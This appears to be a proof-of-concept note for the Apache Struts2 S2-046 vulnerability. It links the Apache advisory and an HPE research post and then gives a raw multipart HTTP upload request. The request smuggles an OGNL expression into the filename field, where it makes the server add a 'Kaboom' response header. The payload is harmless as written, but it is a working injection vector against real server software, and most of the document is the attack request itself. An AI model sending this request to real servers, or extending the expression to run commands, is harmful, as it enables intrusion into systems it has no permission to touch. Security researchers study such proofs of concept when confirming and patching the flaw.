https://cwiki.apache.org/confluence/display/WW/S2-046

https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#.WNAr_RLyvpR

https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#

POC


POST /fileupload/doUpload.action HTTP/1.1

Host: 192.168.233.62:8086

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Referer: http://192.168.233.62:8086/fileupload/upload.action
Cookie: JSESSIONID=36B0F1EAB8CFC76F833E041AEE8A7575
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 2
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z
Connection: close
 
------WebKitFormBoundaryAnmUgTEhFhOZpr9z
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
Content-Type: text/plain
Kaboom 
 
------WebKitFormBoundaryAnmUgTEhFhOZpr9z--
